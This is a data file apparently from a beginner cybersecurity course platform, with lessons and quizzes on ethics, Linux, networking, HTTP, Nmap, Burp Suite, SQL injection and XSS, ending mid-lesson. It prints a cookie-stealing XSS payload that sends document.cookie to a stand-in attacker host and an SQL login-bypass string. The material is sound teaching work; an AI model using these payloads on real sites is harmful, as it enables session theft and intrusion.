/**
 * CyberPath — Phase 3 Curriculum & Learning Engine Data
 *
 * Comprehensive beginner-friendly cybersecurity curriculum covering:
 * 1. Red Team — Ethical Hacking (12 lessons)
 * 2. Blue Team — Defensive Security (9 lessons)
 * 3. Web Security — Application Security (10 lessons)
 *
 * Educational integrity: strictly emphasizes legal training environments
 * (TryHackMe, PortSwigger, OverTheWire, pwn.college) and authorized testing.
 */

export const LEARNING_PATHS = [
  {
    slug: "red-team",
    title: "Red Team",
    subtitle: "Ethical Hacking & Offensive Security",
    badgeAward: "Red Team Specialist",
    colorTheme: "blue",
    description: "Learn the ethical hacker methodology: safe lab setup, reconnaissance, port scanning, vulnerability discovery, web flaws, and authorized penetration testing workflows.",
    accentColor: "#ffffff",
    modules: [
      {
        id: "rt-mod-1",
        slug: "foundations-ethics",
        title: "Module 1: Foundations, Ethics & Safe Labs",
        description: "Understand the ethical hacking mindset, computer fundamentals, and legal sandbox containment.",
        lessons: [
          {
            slug: "cybersecurity-fundamentals-and-ethics",
            title: "Cybersecurity Fundamentals and Ethics",
            sequenceOrder: 1,
            estimatedMinutes: 30,
            prerequisites: ["None — Beginner Friendly"],
            objectives: [
              "Understand the CIA Triad (Confidentiality, Integrity, Availability)",
              "Differentiate between White Hat, Grey Hat, and Black Hat hackers",
              "Learn the legal boundaries of authorized penetration testing and rules of engagement (RoE)",
              "Understand why unauthorized testing violates cybercrime legislation worldwide (CFAA, Computer Misuse Act)"
            ],
            summary: "Ethical hacking requires absolute discipline and strict adherence to authorization. Never test any system or network without explicit, written permission.",
            contentMarkdown: `### The Ethical Hacker's Mindset

Ethical hacking is the authorized practice of attempting to discover vulnerabilities in an application, system, or organization's infrastructure. Unlike malicious actors, ethical hackers operate under strict **Rules of Engagement (RoE)** and with explicit written permission from the system owner.

#### The Core Security Model: The CIA Triad

1. **Confidentiality:** Preventing unauthorized access to sensitive data (e.g., encryption, access controls).
2. **Integrity:** Ensuring information and systems cannot be tampered with or modified unauthorizedly (e.g., cryptographic hashing, checksums).
3. **Availability:** Ensuring authorized users have uninterrupted access to resources (e.g., redundancy, DDoS mitigation).

#### Legal Frameworks & Boundaries

Testing systems without written permission is illegal in almost every jurisdiction under laws such as:
- **United States:** Computer Fraud and Abuse Act (CFAA)
- **United Kingdom:** Computer Misuse Act (CMA)
- **International Law:** Convention on Cybercrime (Budapest Convention)

\`\`\`bash
# Golden Rule of Ethical Cybersecurity:
# Never perform reconnaissance, scanning, or testing against any target
# unless you own the hardware or hold signed written authorization.
\`\`\`

Always practice in controlled, dedicated virtual labs such as **OverTheWire**, **TryHackMe**, or **PortSwigger Academy**.`,
            keyTakeaways: [
              "Always obtain explicit, written scope documentation before interacting with any target.",
              "Security is about risk management and resilience, not just finding flaws.",
              "Use isolated virtual machines and dedicated training platforms to practice safely."
            ],
            commonPitfalls: [
              "Assuming 'harmless' port scanning against random IP addresses is legal — it can trigger law enforcement alerts.",
              "Failing to define scope boundaries during penetration testing exercises."
            ],
            labGuidance: "Set up a TryHackMe account and complete the free 'Intro to Cybersecurity' room to verify your legal understanding.",
            resources: [
              {
                title: "TryHackMe — Intro to Cybersecurity Room",
                url: "https://tryhackme.com/module/intro-to-cyber-security",
                type: "lab",
                platform: "TryHackMe"
              },
              {
                title: "OWASP Code of Ethics & Practice",
                url: "https://owasp.org/www-policy/operational/code-of-ethics",
                type: "documentation",
                platform: "OWASP"
              }
            ],
            quiz: {
              slug: "quiz-ethics",
              title: "Ethics & Security Fundamentals Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "q1",
                  questionText: "Which pillar of the CIA Triad focuses on preventing unauthorized modification of data?",
                  options: [
                    { id: "a", text: "Confidentiality" },
                    { id: "b", text: "Integrity" },
                    { id: "c", text: "Availability" },
                    { id: "d", text: "Authentication" }
                  ],
                  correctOptionId: "b",
                  explanation: "Integrity guarantees that information is authentic, complete, and protected against unauthorized modification or tampering."
                },
                {
                  id: "q2",
                  questionText: "What document must an ethical penetration tester always possess before initiating an assessment?",
                  options: [
                    { id: "a", text: "A certified malware payload" },
                    { id: "b", text: "Explicit written authorization and defined Rules of Engagement (RoE)" },
                    { id: "c", text: "A personal social media statement" },
                    { id: "d", text: "An anonymous VPN subscription" }
                  ],
                  correctOptionId: "b",
                  explanation: "Penetration testing without signed, written authorization and scope boundaries violates cybercrime statutes."
                },
                {
                  id: "q3",
                  questionText: "Why is practicing on dedicated platforms like TryHackMe and OverTheWire recommended for beginners?",
                  options: [
                    { id: "a", text: "Because public internet servers permit unauthorized port scans" },
                    { id: "b", text: "They provide pre-configured, legal, and isolated sandbox environments" },
                    { id: "c", text: "They disable defensive logging" },
                    { id: "d", text: "They guarantee automated bug bounty payouts" }
                  ],
                  correctOptionId: "b",
                  explanation: "Dedicated training platforms simulate realistic infrastructure legally without risking production systems or violating laws."
                }
              ]
            }
          },
          {
            slug: "linux-fundamentals",
            title: "Linux Fundamentals",
            sequenceOrder: 2,
            estimatedMinutes: 45,
            prerequisites: ["Cybersecurity Fundamentals and Ethics"],
            objectives: [
              "Navigate the hierarchical Linux filesystem (/etc, /var, /bin, /home)",
              "Understand file permissions (rwx, octal notation, chown, chmod)",
              "Inspect running processes, network connections, and system logs",
              "Construct command pipelines using pipes (|), grep, and redirections"
            ],
            summary: "Linux is the operating system of cybersecurity. Security tools, server infrastructure, and network appliances run primarily on Linux.",
            contentMarkdown: `### The Linux Terminal for Security Analysts

Virtually all offensive and defensive cybersecurity tools are designed for Linux. Understanding the command line interface (CLI) is non-negotiable.

#### Essential Directory Navigation

- \`/bin\` and \`/usr/bin\`: Essential executable commands.
- \`/etc\`: System-wide configuration files (e.g., \`/etc/passwd\`, \`/etc/shadow\`).
- \`/var/log\`: System, service, and security event logs.
- \`/home\` and \`/root\`: User and administrative home directories.

#### Essential Commands Cheatsheet

\`\`\`bash
# Navigating and inspecting files
pwd                     # Print current working directory
ls -la                  # List all files including hidden with permissions
cat /etc/os-release     # View OS distribution information

# Permissions inspection and modification
# r = 4 (read), w = 2 (write), x = 1 (execute)
chmod 755 script.sh     # rwxr-xr-x (Owner can write, others read/execute)
chmod 600 id_rsa        # rw------- (Strict private key permissions)

# Pipelines and text parsing
ps aux | grep nginx     # Filter active processes for nginx
cat /var/log/auth.log | grep -i "failed password" | wc -l
\`\`\`

#### Security Significance: File Permissions & SUID

Files with the **SUID (Set User ID)** bit execute with the privileges of the file owner (often root) rather than the user running it:

\`\`\`bash
# Find SUID binaries across the entire filesystem
find / -perm -u=s -type f 2>/dev/null
\`\`\``,
            keyTakeaways: [
              "Mastering the shell pipeline (|) allows rapid triage of large log files and system configurations.",
              "Understand octal file permissions: 755 for executables, 600 for sensitive keys and credentials.",
              "Inspect standard error redirects (2>/dev/null) to suppress noise when executing audits."
            ],
            commonPitfalls: [
              "Running every command with 'sudo' without understanding what the command actually does.",
              "Setting 777 permissions on sensitive files, exposing them to any local user."
            ],
            labGuidance: "Practice on OverTheWire Bandit levels 0 through 10 to gain authentic SSH terminal fluency.",
            resources: [
              {
                title: "OverTheWire: Bandit Wargame",
                url: "https://overthewire.org/wargames/bandit/",
                type: "lab",
                platform: "OverTheWire"
              },
              {
                title: "Linux Journey — Command Line Guide",
                url: "https://linuxjourney.com/",
                type: "documentation",
                platform: "Linux Journey"
              }
            ],
            quiz: {
              slug: "quiz-linux",
              title: "Linux Fundamentals Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "ql1",
                  questionText: "What does the permission value '600' represent on an SSH private key file?",
                  options: [
                    { id: "a", text: "Read, write, and execute for everyone" },
                    { id: "b", text: "Read and write for the file owner only; no permissions for group or others" },
                    { id: "c", text: "Execute only for the owner" },
                    { id: "d", text: "Public read-only access" }
                  ],
                  correctOptionId: "b",
                  explanation: "Octal 600 translates to 'rw-------': Read (4) + Write (2) = 6 for the owner, with zero access for group and others."
                },
                {
                  id: "ql2",
                  questionText: "Where are system authentication logs typically stored on Debian/Ubuntu-based Linux systems?",
                  options: [
                    { id: "a", text: "/etc/passwd" },
                    { id: "b", text: "/var/log/auth.log" },
                    { id: "c", text: "/bin/systemd" },
                    { id: "d", text: "/tmp/logs" }
                  ],
                  correctOptionId: "b",
                  explanation: "Debian and Ubuntu store authentication logs (SSH logins, sudo usage) in /var/log/auth.log."
                },
                {
                  id: "ql3",
                  questionText: "What does the command 'find / -perm -u=s 2>/dev/null' accomplish?",
                  options: [
                    { id: "a", text: "Deletes all temporary files silently" },
                    { id: "b", text: "Searches for SUID binaries while suppressing permission-denied errors" },
                    { id: "c", text: "Lists all users currently logged in via SSH" },
                    { id: "d", text: "Disables system firewall rules" }
                  ],
                  correctOptionId: "b",
                  explanation: "The -perm -u=s flag filters for SUID files, and 2>/dev/null redirects standard error to suppress permission warnings."
                }
              ]
            }
          },
          {
            slug: "networking-fundamentals",
            title: "Networking Fundamentals",
            sequenceOrder: 3,
            estimatedMinutes: 40,
            prerequisites: ["Linux Fundamentals"],
            objectives: [
              "Understand the OSI 7-layer model vs TCP/IP stack",
              "Master IP addressing, CIDR notation, and subnets (/24, /16)",
              "Understand TCP 3-way handshake (SYN, SYN-ACK, ACK) and UDP connectionless mechanics",
              "Learn common well-known ports (22, 53, 80, 443, 445, 3389)"
            ],
            summary: "Cybersecurity is applied networking. You cannot defend or penetrate a network you do not understand.",
            contentMarkdown: `### Networking Mechanics for Cyber Analysts

Every security interaction — from visiting a website to exploiting a remote buffer overflow — travels over network protocols.

#### The TCP 3-Way Handshake

TCP provides reliable, ordered transmission through a synchronization sequence:
1. **Client -> Server:** \`SYN\` (Synchronize sequence numbers)
2. **Server -> Client:** \`SYN-ACK\` (Acknowledge client SYN, send server sequence)
3. **Client -> Server:** \`ACK\` (Acknowledge server SYN; connection established)

When a port is **closed**, the target responds with \`RST\` (Reset). When a firewall drops packets silently, the port appears **filtered**.

#### Essential Ports to Memorize

| Port | Protocol | Typical Service | Security Implications |
|---|---|---|---|
| 21 | TCP | FTP | Cleartext file transfer, legacy credentials |
| 22 | TCP | SSH | Secure remote shell, public-key auth |
| 53 | UDP/TCP | DNS | Domain name resolution, DNS exfiltration |
| 80 | TCP | HTTP | Unencrypted web traffic |
| 443 | TCP | HTTPS | TLS/SSL encrypted web traffic |
| 445 | TCP | SMB | Windows file sharing, EternalBlue target |
| 3389 | TCP | RDP | Windows Remote Desktop Protocol |

\`\`\`bash
# Inspecting active connections locally
ss -tuln          # TCP/UDP listening sockets without resolving names
ip a              # List network interfaces and assigned IP/CIDR addresses
traceroute 1.1.1.1 # Trace route hops across the network
\`\`\``,
            keyTakeaways: [
              "TCP establishes verified sessions via SYN -> SYN-ACK -> ACK; UDP is lightweight and connectionless.",
              "CIDR /24 indicates 256 addresses (254 usable host addresses on a standard subnet).",
              "Port scanners analyze TCP handshake responses to deduce whether ports are open, closed, or filtered."
            ],
            commonPitfalls: [
              "Confusing private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) with routable public IPs.",
              "Assuming UDP is inherently encrypted; it is simply connectionless."
            ],
            labGuidance: "Complete TryHackMe's 'Intro to Networking' room to visualize packet captures in Wireshark.",
            resources: [
              {
                title: "TryHackMe — Network Fundamentals",
                url: "https://tryhackme.com/module/network-fundamentals",
                type: "lab",
                platform: "TryHackMe"
              },
              {
                title: "RFC 793 — Transmission Control Protocol Specification",
                url: "https://datatracker.ietf.org/doc/html/rfc793",
                type: "documentation",
                platform: "IETF RFC"
              }
            ],
            quiz: {
              slug: "quiz-networking",
              title: "Networking Fundamentals Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qn1",
                  questionText: "Which sequence correctly represents the standard TCP three-way handshake?",
                  options: [
                    { id: "a", text: "ACK -> SYN -> RST" },
                    { id: "b", text: "SYN -> SYN-ACK -> ACK" },
                    { id: "c", text: "PING -> PONG -> CONNECT" },
                    { id: "d", text: "HELLO -> READY -> OK" }
                  ],
                  correctOptionId: "b",
                  explanation: "The TCP handshake begins with a client SYN, followed by a server SYN-ACK, and finalized by a client ACK."
                },
                {
                  id: "qn2",
                  questionText: "Which port is used for secure remote management over SSH?",
                  options: [
                    { id: "a", text: "Port 21" },
                    { id: "b", text: "Port 22" },
                    { id: "c", text: "Port 80" },
                    { id: "d", text: "Port 445" }
                  ],
                  correctOptionId: "b",
                  explanation: "Port 22 is the standard TCP port for the Secure Shell (SSH) protocol."
                },
                {
                  id: "qn3",
                  questionText: "What response does an active host typically return when a TCP SYN packet reaches a closed port?",
                  options: [
                    { id: "a", text: "SYN-ACK" },
                    { id: "b", text: "RST (Reset)" },
                    { id: "c", text: "HTTP 404 Not Found" },
                    { id: "d", text: "No response (Timeout)" }
                  ],
                  correctOptionId: "b",
                  explanation: "When an operating system receives a SYN packet for a port without an active listening service, it responds with a TCP RST (Reset) flag."
                }
              ]
            }
          },
          {
            slug: "http-https-and-web-basics",
            title: "HTTP, HTTPS, and Web Basics",
            sequenceOrder: 4,
            estimatedMinutes: 35,
            prerequisites: ["Networking Fundamentals"],
            objectives: [
              "Understand HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS)",
              "Inspect HTTP status code classes (2xx, 3xx, 4xx, 5xx)",
              "Learn headers: Host, User-Agent, Authorization, Set-Cookie, Content-Type",
              "Understand TLS/SSL handshakes and why plain HTTP is vulnerable to eavesdropping"
            ],
            summary: "HTTP is the foundational text-based protocol of the web. Understanding raw request/response pairs is essential for application security.",
            contentMarkdown: `### The Structure of an HTTP Request

Web communication follows a client-server stateless request-response architecture.

\`\`\`http
POST /api/v1/login HTTP/1.1
Host: secure.cyberpath.internal
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Content-Type: application/json
Content-Length: 48

{"username":"admin","password":"SampleSecret123"}
\`\`\`

#### HTTP Response Status Codes

- **200 OK:** Request succeeded.
- **301 / 302:** Redirection to a new URI.
- **401 Unauthorized:** Authentication credentials missing or invalid.
- **403 Forbidden:** Authenticated user lacks permission to access resource.
- **404 Not Found:** Requested resource does not exist.
- **500 Internal Server Error:** Unhandled exception on server (often reveals debug information).`,
            keyTakeaways: [
              "HTTP is plaintext; HTTPS encapsulates HTTP inside a TLS (Transport Layer Security) encrypted tunnel.",
              "Cookies set via 'Set-Cookie' header should include 'HttpOnly', 'Secure', and 'SameSite' attributes.",
              "Status code 401 means unauthenticated, while 403 means authenticated but unauthorized."
            ],
            commonPitfalls: [
              "Confusing authentication (who you are) with authorization (what you are allowed to do).",
              "Assuming HTTPS encrypts URL query parameters from the destination server (it only encrypts in transit)."
            ],
            labGuidance: "Open your browser Developer Tools (F12) Network tab and inspect the raw headers sent during login.",
            resources: [
              {
                title: "MDN Web Docs — An overview of HTTP",
                url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview",
                type: "documentation",
                platform: "Mozilla MDN"
              }
            ],
            quiz: {
              slug: "quiz-http-basics",
              title: "HTTP & Web Protocol Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qh1",
                  questionText: "Which HTTP status code signifies that the client is authenticated but forbidden from viewing the requested resource?",
                  options: [
                    { id: "a", text: "200 OK" },
                    { id: "b", text: "401 Unauthorized" },
                    { id: "c", text: "403 Forbidden" },
                    { id: "d", text: "502 Bad Gateway" }
                  ],
                  correctOptionId: "c",
                  explanation: "403 Forbidden means the server recognizes the identity of the user, but refuses to authorize access to the requested resource."
                },
                {
                  id: "qh2",
                  questionText: "What cookie attribute prevents client-side JavaScript from accessing session tokens, mitigating XSS token theft?",
                  options: [
                    { id: "a", text: "HttpOnly" },
                    { id: "b", text: "Secure" },
                    { id: "c", text: "SameSite" },
                    { id: "d", text: "Domain" }
                  ],
                  correctOptionId: "a",
                  explanation: "The HttpOnly flag blocks client-side scripts from reading document.cookie, mitigating session hijacking via XSS."
                }
              ]
            }
          },
          {
            slug: "safe-lab-setup",
            title: "Safe Lab Setup & Virtualization",
            sequenceOrder: 5,
            estimatedMinutes: 35,
            prerequisites: ["HTTP, HTTPS, and Web Basics"],
            objectives: [
              "Set up hypervisors: VirtualBox / VMware Workstation",
              "Configure Host-Only, NAT, and Internal isolated virtual networks",
              "Deploy Kali Linux or Parrot OS attacker machines safely",
              "Understand host machine isolation to prevent accidental malware spillover"
            ],
            summary: "Building an isolated, virtualized sandbox guarantees that experimental tools and test payloads never escape into your home or corporate network.",
            contentMarkdown: `### Designing a Contained Security Lab

Never conduct security testing directly on your primary host operating system. Always operate within a controlled hypervisor.

#### Hypervisor Network Modes

1. **Host-Only:** The virtual machine can only communicate with the host and other VMs on the same host-only adapter. Zero direct internet access.
2. **Internal Network:** VMs communicate only among themselves; host cannot route in.
3. **NAT (Network Address Translation):** The VM accesses the internet via the host's IP, but outside devices cannot initiate inbound connections.

\`\`\`bash
# Verifying network isolation inside a test VM
# Ensure default gateway routes only into your designated lab subnet
ip route show
\`\`\`

#### Best Practices for Lab Hygiene

- **Snapshots:** Always create a clean baseline snapshot before executing vulnerability experiments.
- **Shared Folders:** Disable automatic host-guest clipboard and folder sharing when analyzing suspicious files.`,
            keyTakeaways: [
              "Use snapshots to restore virtual machines to known clean states instantly.",
              "Host-only and Internal networks prevent accidental packet leaks onto home or school Wi-Fi.",
              "Keep the host machine patched and separated from experimental guest machines."
            ],
            commonPitfalls: [
              "Bridging a vulnerable test VM directly to a public Wi-Fi network, exposing it to neighboring devices."
            ],
            labGuidance: "Install VirtualBox and create an isolated internal network for experimental VMs.",
            resources: [
              {
                title: "VirtualBox Documentation — Networking Modes",
                url: "https://www.virtualbox.org/manual/ch06.html",
                type: "documentation",
                platform: "Oracle VirtualBox"
              }
            ]
          }
        ]
      },
      {
        id: "rt-mod-2",
        slug: "recon-and-scanning",
        title: "Module 2: Reconnaissance & Scanning",
        description: "Master open-source intelligence, DNS discovery, port auditing, and proxy interception.",
        lessons: [
          {
            slug: "reconnaissance-and-enumeration",
            title: "Reconnaissance and Enumeration",
            sequenceOrder: 6,
            estimatedMinutes: 40,
            prerequisites: ["Safe Lab Setup & Virtualization"],
            objectives: [
              "Distinguish between Passive Recon (zero contact) and Active Recon (packet transmission)",
              "Use OSINT tools: WHOIS, DNS record querying (dig, nslookup)",
              "Perform subdomain enumeration using Certificate Transparency logs (crt.sh)",
              "Identify attack surface boundaries and avoid out-of-scope assets"
            ],
            summary: "Reconnaissance is the initial phase of any authorized assessment. Thorough reconnaissance reveals misconfigurations before touching a target.",
            contentMarkdown: `### Passive vs. Active Information Gathering

Reconnaissance determines the attack surface of a target.

#### Passive Reconnaissance (No Direct Target Contact)

Passive gathering leverages public data sources so the target never sees an inbound packet from your IP address:
- **Search Engine Dorking:** Querying public indexes for indexed sensitive files.
- **Certificate Transparency Logs:** Inspecting SSL/TLS certificates issued to a domain at [crt.sh](https://crt.sh).
- **DNS Records:** Querying authoritative public name servers.

\`\`\`bash
# Querying DNS records passively
dig cyberpath.internal ANY +noall +answer
dig cyberpath.internal MX
\`\`\`

#### Active Reconnaissance (Direct Packets)

Active enumeration sends traffic directly to target infrastructure:
\`\`\`bash
# Subdomain brute forcing against authorized lab target
gobuster dns -d target.lab -w /usr/share/wordlists/dirb/common.txt
\`\`\``,
            keyTakeaways: [
              "Passive recon leaves no trace in the target's firewall or SIEM logs.",
              "Certificate Transparency logs are one of the most effective passive methods to find forgotten subdomains.",
              "Always cross-reference discovered assets against your authorized Scope document."
            ],
            commonPitfalls: [
              "Targeting an asset simply because its name matches the client (e.g., third-party SaaS vendors out of scope)."
            ],
            labGuidance: "Complete TryHackMe's 'Passive Reconnaissance' room to practice querying public registries legally.",
            resources: [
              {
                title: "TryHackMe — Passive Reconnaissance",
                url: "https://tryhackme.com/room/passiverecon",
                type: "lab",
                platform: "TryHackMe"
              }
            ]
          },
          {
            slug: "nmap-fundamentals",
            title: "Nmap Fundamentals",
            sequenceOrder: 7,
            estimatedMinutes: 45,
            prerequisites: ["Reconnaissance and Enumeration"],
            objectives: [
              "Execute basic TCP SYN stealth scans (-sS) and TCP Connect scans (-sT)",
              "Perform service version detection (-sV) and OS detection (-O)",
              "Utilize the Nmap Scripting Engine (NSE) safely with default scripts (-sC)",
              "Export scan outputs in normal, XML, and grepable formats (-oA)"
            ],
            summary: "Nmap (Network Mapper) is the industry standard tool for host discovery, port scanning, and service version enumeration.",
            contentMarkdown: `### Auditing Networks with Nmap

Nmap crafts raw TCP and UDP packets to deduce the status of remote ports and running services.

#### Core Scan Types

1. **TCP SYN Scan (\`-sS\`):** The default scan when running as root. Sends SYN; if SYN-ACK is returned, Nmap sends RST without completing the handshake. Fast and stealthy.
2. **TCP Connect Scan (\`-sT\`):** Completes the full 3-way handshake. Used when raw packet crafting permissions are unavailable.
3. **UDP Scan (\`-sU\`):** Audits UDP services (DNS, SNMP, NTP). Slower due to ICMP rate limiting.

\`\`\`bash
# Standard ethical baseline scan against authorized host
# -sC: Default scripts
# -sV: Version detection
# -oA: Output all formats into scan_results.*
nmap -sC -sV -oA scan_results 10.10.10.25

# Comprehensive scan of all 65,535 ports
nmap -p- --min-rate 1000 -oA all_ports 10.10.10.25
\`\`\`

#### Interpreting Port States

- **Open:** Application actively listening and responding with SYN-ACK.
- **Closed:** Host is up; returned RST flag indicating no application is listening.
- **Filtered:** Packet dropped by firewall; no response received.`,
            keyTakeaways: [
              "Always save scan outputs with -oA to preserve findings for the assessment report.",
              "-sC runs safe, non-intrusive Nmap Scripting Engine (NSE) scripts; never run intrusive scripts without permission.",
              "Use --min-rate cautiously to avoid overwhelming network infrastructure or dropping valid responses."
            ],
            commonPitfalls: [
              "Scanning all 65,535 ports with aggressive scripts without bandwidth limits, causing Denial of Service.",
              "Misinterpreting 'filtered' as 'closed' — filtered means a firewall intercepted the packet."
            ],
            labGuidance: "Complete TryHackMe's 'Nmap Basics' guided room.",
            resources: [
              {
                title: "Nmap Official Reference Guide",
                url: "https://nmap.org/book/man.html",
                type: "documentation",
                platform: "Insecure.org"
              },
              {
                title: "TryHackMe — Nmap Room",
                url: "https://tryhackme.com/room/furthernmap",
                type: "lab",
                platform: "TryHackMe"
              }
            ],
            quiz: {
              slug: "quiz-nmap",
              title: "Nmap Scanning Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qn1",
                  questionText: "What does Nmap send after receiving a SYN-ACK during a TCP SYN scan (-sS)?",
                  options: [
                    { id: "a", text: "An ACK packet to establish the connection" },
                    { id: "b", text: "A RST (Reset) packet to close the half-open connection" },
                    { id: "c", text: "A FIN packet" },
                    { id: "d", text: "An HTTP GET request" }
                  ],
                  correctOptionId: "b",
                  explanation: "A SYN scan never completes the full handshake; upon receiving SYN-ACK, Nmap immediately sends RST to tear down the connection."
                },
                {
                  id: "qn2",
                  questionText: "Which Nmap flag executes service version detection against open ports?",
                  options: [
                    { id: "a", text: "-sV" },
                    { id: "b", text: "-O" },
                    { id: "c", text: "-Pn" },
                    { id: "d", text: "-p-" }
                  ],
                  correctOptionId: "a",
                  explanation: "-sV queries open ports using probe signatures to determine the exact service name and version."
                }
              ]
            }
          },
          {
            slug: "burp-suite-fundamentals",
            title: "Burp Suite Fundamentals",
            sequenceOrder: 8,
            estimatedMinutes: 45,
            prerequisites: ["HTTP, HTTPS, and Web Basics"],
            objectives: [
              "Understand intercepting proxy architecture between browser and web server",
              "Install Burp Suite Community Edition and configure CA Certificates",
              "Use Burp Proxy and Repeater for manual request inspection and modification",
              "Understand the HTTP history log and target sitemap"
            ],
            summary: "Burp Suite is the premiere intercepting proxy for web application testing, allowing analysts to view and modify HTTP traffic in real time.",
            contentMarkdown: `### The Intercepting Proxy Workflow

When testing web applications, you cannot rely on what the browser UI displays. Attackers bypass client-side validation by intercepting requests before they reach the server.

\`\`\`
[ Browser ] ---> [ Burp Suite Proxy (127.0.0.1:8080) ] ---> [ Target Web Server ]
\`\`\`

#### Core Burp Suite Modules

1. **Proxy:** Intercepts, inspects, and modifies traffic on the fly.
2. **Repeater:** Allows you to send modified HTTP requests repeatedly and inspect the response diff.
3. **Target:** Generates a structured sitemap of every endpoint and asset discovered.
4. **Decoder:** Encodes, decodes, and hashes strings (URL, Base64, Hex, HTML).

\`\`\`http
# Example modification in Burp Repeater:
# Original request sent by browser:
POST /api/transfer HTTP/1.1
Host: bank.local
{"to_account": "user42", "amount": 100}

# Modified in Repeater to test negative balance logic:
POST /api/transfer HTTP/1.1
Host: bank.local
{"to_account": "user42", "amount": -100}
\`\`\``,
            keyTakeaways: [
              "Client-side restrictions (HTML disabled buttons, JS validation) are easily bypassed in an intercepting proxy.",
              "Burp Repeater is the core tool for testing business logic and parameter tampering.",
              "Install Burp's PortSwigger CA certificate into your test browser to intercept HTTPS without security warnings."
            ],
            commonPitfalls: [
              "Leaving Burp Proxy 'Intercept On' while browsing regular websites, causing requests to hang indefinitely."
            ],
            labGuidance: "Install Burp Suite Community Edition and set up your browser to route via 127.0.0.1:8080.",
            resources: [
              {
                title: "PortSwigger — Getting Started with Burp Suite",
                url: "https://portswigger.net/burp/documentation/desktop/getting-started",
                type: "documentation",
                platform: "PortSwigger"
              }
            ]
          }
        ]
      },
      {
        id: "rt-mod-3",
        slug: "web-flaws-and-ctf",
        title: "Module 3: Web Vulnerabilities, Labs & CTF",
        description: "Explore core web vulnerabilities, guided sandbox labs, and beginner Capture-The-Flag mechanics.",
        lessons: [
          {
            slug: "introduction-to-sql-injection",
            title: "Introduction to SQL Injection",
            sequenceOrder: 9,
            estimatedMinutes: 45,
            prerequisites: ["Burp Suite Fundamentals"],
            objectives: [
              "Understand how untrusted user input interacts with dynamic database queries",
              "Recognize In-Band (Union-based, Error-based), Blind, and Out-of-Band SQLi",
              "Understand authentication bypass via boolean logic (' OR '1'='1)",
              "Learn remediation through Parameterized Queries (Prepared Statements)"
            ],
            summary: "SQL Injection (SQLi) occurs when malicious user input is concatenated directly into SQL database queries without proper parameterization.",
            contentMarkdown: `### Anatomy of SQL Injection

When developers build SQL queries using string concatenation:

\`\`\`sql
-- Vulnerable server query:
SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASSWORD_INPUT';

-- If USER_INPUT is: admin' --
-- The resulting SQL becomes:
SELECT * FROM users WHERE username = 'admin' --' AND password = '...';
-- The double dash (--) comments out the remainder of the query!
\`\`\`

#### Types of SQL Injection

1. **In-Band SQLi (Classic):** The attacker receives the query results directly inside the application response (e.g., Union-based).
2. **Error-Based SQLi:** Database error messages leak table structure, user data, or query syntax.
3. **Blind SQLi:** The application returns generic responses. The attacker uses boolean true/false conditions or database sleep delays to infer data bit by bit.

#### Remediation: Parameterized Queries

Never concatenate strings into SQL commands. Always use parameterized statements:

\`\`\`javascript
// Secure parameterized query (e.g., Node.js pg / PostgreSQL)
const query = 'SELECT * FROM users WHERE username = $1 AND password_hash = $2';
const result = await db.query(query, [username, hashedPassword]);
\`\`\``,
            keyTakeaways: [
              "Input validation is helpful, but Parameterized Queries (Prepared Statements) are the only bulletproof defense against SQLi.",
              "Union-based injection allows combining arbitrary SELECT statements with original queries when column counts match.",
              "Never test SQL injection payloads on unauthorized websites."
            ],
            commonPitfalls: [
              "Attempting to sanitize SQL queries with basic regex blacklists (e.g., stripping single quotes) instead of prepared statements."
            ],
            labGuidance: "Solve PortSwigger Web Security Academy's free lab: 'SQL injection vulnerability in WHERE clause allowing retrieval of hidden data'.",
            resources: [
              {
                title: "PortSwigger Web Security Academy — SQL Injection Labs",
                url: "https://portswigger.net/web-security/sql-injection",
                type: "lab",
                platform: "PortSwigger"
              }
            ],
            quiz: {
              slug: "quiz-sqli",
              title: "SQL Injection Fundamentals Assessment",
              passingScore: 75,
              questions: [
                {
                  id: "qsq1",
                  questionText: "What is the primary industry standard defense against SQL Injection?",
                  options: [
                    { id: "a", text: "Removing spaces from all user input" },
                    { id: "b", text: "Using Parameterized Queries (Prepared Statements)" },
                    { id: "c", text: "Encrypting database traffic with HTTPS" },
                    { id: "d", text: "Storing passwords in plain text" }
                  ],
                  correctOptionId: "b",
                  explanation: "Parameterized queries ensure the database treats user input strictly as literal values, never as executable SQL code."
                },
                {
                  id: "qsq2",
                  questionText: "In SQL, what function do characters like '--' or '#' serve when injected into a query?",
                  options: [
                    { id: "a", text: "They terminate the database server" },
                    { id: "b", text: "They comment out the remaining portions of the SQL statement" },
                    { id: "c", text: "They encrypt the output query" },
                    { id: "d", text: "They create an administrator user account" }
                  ],
                  correctOptionId: "b",
                  explanation: "In SQL syntax, '--' marks the beginning of a single-line comment, causing the database to ignore remaining conditions like password checks."
                }
              ]
            }
          },
          {
            slug: "introduction-to-cross-site-scripting",
            title: "Introduction to Cross-Site Scripting (XSS)",
            sequenceOrder: 10,
            estimatedMinutes: 40,
            prerequisites: ["Introduction to SQL Injection"],
            objectives: [
              "Understand the 3 core types of XSS: Reflected, Stored, and DOM-based",
              "Understand the threat model: session cookie theft, keylogging, and page defacement",
              "Learn proper mitigation: Context-aware output encoding and Content Security Policy (CSP)"
            ],
            summary: "Cross-Site Scripting occurs when an application includes untrusted data in a web page without proper validation or escaping, executing malicious scripts in the victim's browser.",
            contentMarkdown: `### The Mechanics of Cross-Site Scripting

While SQLi targets the server database, XSS executes inside the **victim's web browser** under the trust of the vulnerable website.

#### The Three Types of XSS

1. **Reflected XSS:** The malicious payload is reflected off a web server (e.g., in search queries or error messages) and executes immediately when a victim clicks a crafted link.
2. **Stored XSS (Persistent):** The payload is stored in the database (e.g., user comments, profile biographies) and executes whenever any user views the infected page.
3. **DOM-based XSS:** The vulnerability exists purely in client-side JavaScript execution (e.g., unsafe \`innerHTML\` or \`eval\` processing of \`location.hash\`).

\`\`\`html
<!-- Vulnerable markup: unsanitized user search parameter -->
<p>Search results for: <?php echo $_GET['q']; ?></p>

<!-- Payload injected: -->
<script>fetch('https://attacker.site/steal?cookie=' + document.cookie)</script>
\`\`\`

#### Defenses

